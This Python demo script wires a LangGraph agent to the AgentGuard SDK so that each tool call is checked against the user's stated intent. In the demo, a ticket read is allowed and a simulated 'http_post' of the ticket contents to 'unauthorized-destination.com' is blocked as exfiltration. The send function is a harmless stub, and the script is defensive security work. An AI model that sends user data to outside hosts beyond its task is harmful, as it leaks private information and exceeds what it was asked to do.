"""
LangGraph + AgentGuard Integration Demo

Demonstrates protecting LangGraph tool calls using AgentGuard SDK.
"""

from typing import Annotated, TypedDict
from typing_extensions import TypedDict

from langchain_core.messages import HumanMessage, BaseMessage
from langgraph.graph import StateGraph, START, END
from langgraph.graph.message import add_messages

from agentguard import verify_tool_call, set_session_context


class AgentState(TypedDict):
    messages: Annotated[list[BaseMessage], add_messages]
    session_id: str
    user_intent: str


def read_ticket_tool(ticket_id: str) -> str:
    return f"Ticket #{ticket_id}: Customer requests invoice summary."


def send_external_data_tool(url: str, data: str) -> str:
    return f"Data sent to {url}"


def execute_tool_safely(session_id: str, user_intent: str, tool_name: str, args: dict, tool_func):
    print(f"\n[AgentGuard Interceptor] Evaluating call to '{tool_name}'...")
    
    decision = verify_tool_call(
        session_id=session_id,
        agent_id="langgraph-support-agent",
        user_intent=user_intent,
        tool=tool_name,
        arguments=args
    )
    
    if decision.get("decision") == "BLOCK":
        reasons = decision.get("reasons", ["Blocked by policy"])
        print(f"❌ [BLOCKED] AgentGuard stopped tool '{tool_name}': {reasons}")
        return f"Error: Tool execution blocked by security policy. Reason: {reasons}"
    
    print(f"✅ [ALLOWED] Tool '{tool_name}' approved by AgentGuard.")
    return tool_func(**args)


def agent_node(state: AgentState):
    session_id = state["session_id"]
    user_intent = state["user_intent"]
    
    # 1. Allowed action
    ticket_res = execute_tool_safely(
        session_id=session_id,
        user_intent=user_intent,
        tool_name="read_ticket",
        args={"ticket_id": "1042"},
        tool_func=read_ticket_tool
    )
    
    # 2. Blocked exfiltration action
    exfil_res = execute_tool_safely(
        session_id=session_id,
        user_intent=user_intent,
        tool_name="http_post",
        args={"url": "https://unauthorized-destination.com", "data": ticket_res},
        tool_func=send_external_data_tool
    )
    
    return {"messages": [HumanMessage(content=f"Workflow completed. Result: {exfil_res}")]}


def run_demo():
    session_id = "langgraph-sess-001"
    user_intent = "Summarize the ticket only"
    
    print("=" * 60)
    print("Starting LangGraph + AgentGuard Security Demo")
    print(f"Session ID:  {session_id}")
    print(f"User Intent: '{user_intent}'")
    print("=" * 60)

    set_session_context(session_id, user_intent=user_intent)

    workflow = StateGraph(AgentState)
    workflow.add_node("agent", agent_node)
    workflow.add_edge(START, "agent")
    workflow.add_edge("agent", END)
    
    app = workflow.compile()

    initial_state = {
        "messages": [HumanMessage(content="Process ticket 1042")],
        "session_id": session_id,
        "user_intent": user_intent
    }
    
    app.invoke(initial_state)
    print("\n" + "=" * 60)
    print("Demo Execution Finished.")
    print("=" * 60)


if __name__ == "__main__":
    run_demo()